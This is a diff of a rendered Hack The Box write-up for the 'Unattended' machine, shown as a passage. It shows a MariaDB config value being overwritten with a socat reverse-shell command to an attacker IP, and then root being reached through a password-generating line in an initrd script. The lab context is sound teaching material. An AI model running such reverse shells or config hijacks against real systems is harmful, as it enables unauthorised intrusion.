+<span class="o">|</span> <span class="mi">102</span> <span class="o">|</span> <span class="n">unicodeslugs</span>            <span class="o">|</span> <span class="mi">0</span>                                                                        <span class="o">|</span>          
+<span class="o">|</span> <span class="mi">103</span> <span class="o">|</span> <span class="n">feed_limit</span>              <span class="o">|</span> <span class="mi">10</span>                                                                       <span class="o">|</span>         
+<span class="o">|</span> <span class="mi">104</span> <span class="o">|</span> <span class="n">lifetime</span>                <span class="o">|</span> <span class="mi">1</span>                                                                        <span class="o">|</span>          
+<span class="o">|</span> <span class="mi">105</span> <span class="o">|</span> <span class="n">session_handler</span>         <span class="o">|</span> <span class="n">file</span>                                                                     <span class="o">|</span>         
+<span class="o">+</span><span class="c1">-----+-------------------------+--------------------------------------------------------------------------+                                                                                                      </span>
+<span class="mi">52</span> <span class="k">rows</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>
 
-MariaDB [neddy]&gt;
+<span class="n">MariaDB</span> <span class="p">[</span><span class="n">neddy</span><span class="p">]</span><span class="o">&gt;</span>
 </code></pre></div></div>
 <p><br> The row with id 86 looks interesting. It has a value of some <code class="highlighter-rouge">perl</code> scripts :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/home/guly/checkbase.pl;/home/guly/checkplugins.pl;
 </code></pre></div></div>
 <p><br> Apparently these scripts get executed from time to time, we can’t read these scripts or replace them, but we can change the value of that configuration from the database and put a reverse shell command. There’s no <code class="highlighter-rouge">nc</code> so I used <code class="highlighter-rouge">socat</code> :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MariaDB [neddy]&gt; update config set option_value="socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.xx.xx:443;" where id=86;
-Query OK, 0 rows affected (0.00 sec)
-Rows matched: 1  Changed: 0  Warnings: 0                                                     
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">MariaDB</span> <span class="p">[</span><span class="n">neddy</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">update</span> <span class="n">config</span> <span class="k">set</span> <span class="n">option_value</span><span class="o">=</span><span class="nv">"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.xx.xx:443;"</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="mi">86</span><span class="p">;</span>
+<span class="n">Query</span> <span class="n">OK</span><span class="p">,</span> <span class="mi">0</span> <span class="k">rows</span> <span class="n">affected</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>
+<span class="k">Rows</span> <span class="n">matched</span><span class="p">:</span> <span class="mi">1</span>  <span class="n">Changed</span><span class="p">:</span> <span class="mi">0</span>  <span class="n">Warnings</span><span class="p">:</span> <span class="mi">0</span>                                                     
 
-MariaDB [neddy]&gt; select * from config;
-select * from config;                                                                       
-----------------
- Removed Output
-----------------
-|  86 | checkrelease            | socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.xx.xx:443; |
-----------------
- Removed Output
-----------------
-52 rows in set (0.00 sec)
+<span class="n">MariaDB</span> <span class="p">[</span><span class="n">neddy</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">config</span><span class="p">;</span>
+<span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">config</span><span class="p">;</span>                                                                       
+<span class="c1">----------------</span>
+ <span class="n">Removed</span> <span class="k">Output</span>
+<span class="c1">----------------</span>
+<span class="o">|</span>  <span class="mi">86</span> <span class="o">|</span> <span class="n">checkrelease</span>            <span class="o">|</span> <span class="n">socat</span> <span class="k">exec</span><span class="p">:</span><span class="s1">'bash -li'</span><span class="p">,</span><span class="n">pty</span><span class="p">,</span><span class="n">stderr</span><span class="p">,</span><span class="n">setsid</span><span class="p">,</span><span class="n">sigint</span><span class="p">,</span><span class="n">sane</span> <span class="n">tcp</span><span class="p">:</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="n">xx</span><span class="p">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">443</span><span class="p">;</span> <span class="o">|</span>
+<span class="c1">----------------</span>
+ <span class="n">Removed</span> <span class="k">Output</span>
+<span class="c1">----------------</span>
+<span class="mi">52</span> <span class="k">rows</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>
 
-MariaDB [neddy]&gt;
+<span class="n">MariaDB</span> <span class="p">[</span><span class="n">neddy</span><span class="p">]</span><span class="o">&gt;</span>
 </code></pre></div></div>
-<p><img src="/images/hackthebox/unattended/18.png" alt="">
+<p><br><img src="/images/hackthebox/unattended/18.png" alt=""><br>
 <br> We owned user.
 <br></p>
 <hr>
@@ -1200,7 +1194,7 @@ guly@unattended:/tmp$ php ./shell.php
 php ./shell.php
 /*
 </code></pre></div></div>
-<p><img src="/images/hackthebox/unattended/19.png" alt="">
+<p><br><img src="/images/hackthebox/unattended/19.png" alt=""><br>
 <br> I noticed that <code class="highlighter-rouge">guly</code> was in the local group <code class="highlighter-rouge">grub</code>, I searched for files that are owned by this group :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>guly@unattended:/tmp$ find / -group grub
 find / -group grub
@@ -1323,13 +1317,13 @@ Binary file initrd.img-4.9.0-8-amd64 matches
 scripts/local-top/cryptroot:      # guly: we have to deal with lukfs password sync when root changes her one
 </code></pre></div></div>
 <p><br> I checked that part of the script :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>               if [ ! -e "$NEWROOT" ]; then
-      # guly: we have to deal with lukfs password sync when root changes her one
-      if ! crypttarget="$crypttarget" cryptsource="$cryptsource" \
-        /sbin/uinitrd c0m3s3f0ss34nt4n1 | $cryptopen ; then
-                                message "cryptsetup: cryptsetup failed, bad password or options?"
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>               <span class="k">if</span> <span class="o">[</span> <span class="o">!</span> <span class="nt">-e</span> <span class="s2">"</span><span class="nv">$NEWROOT</span><span class="s2">"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+      <span class="c"># guly: we have to deal with lukfs password sync when root changes her one</span>
+      <span class="k">if</span> <span class="o">!</span> <span class="nv">crypttarget</span><span class="o">=</span><span class="s2">"</span><span class="nv">$crypttarget</span><span class="s2">"</span> <span class="nv">cryptsource</span><span class="o">=</span><span class="s2">"</span><span class="nv">$cryptsource</span><span class="s2">"</span> <span class="se">\</span>
+        /sbin/uinitrd c0m3s3f0ss34nt4n1 | <span class="nv">$cryptopen</span> <span class="p">;</span> <span class="k">then
+                                </span>message <span class="s2">"cryptsetup: cryptsetup failed, bad password or options?"</span>
                                 sleep 3
-                                continue
+                                <span class="k">continue</span>
 
 </code></pre></div></div>
 <p><br> This line <code class="highlighter-rouge">/sbin/uinitrd c0m3s3f0ss34nt4n1 | $cryptopen</code> generates root password and pipes it to <code class="highlighter-rouge">$cryptopen</code>. We don’t have permission to execute <code class="highlighter-rouge">uinitrd</code> :</p>
@@ -1360,7 +1354,7 @@ ls -la sbin | grep uinitrd
 -rwxr-x---   1 guly guly 933240 Aug 23 05:26 uinitrd
 guly@unattended:/tmp/initrd$ 
 </code></pre></div></div>
-<p><img src="/images/hackthebox/unattended/20.png" alt="">
+<p><br><img src="/images/hackthebox/unattended/20.png" alt=""><br>
 <br> And we owned root !
 <br> That’s it , Feedback is appreciated !
 <br> Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer">@Ahm3d_H3sham</a>
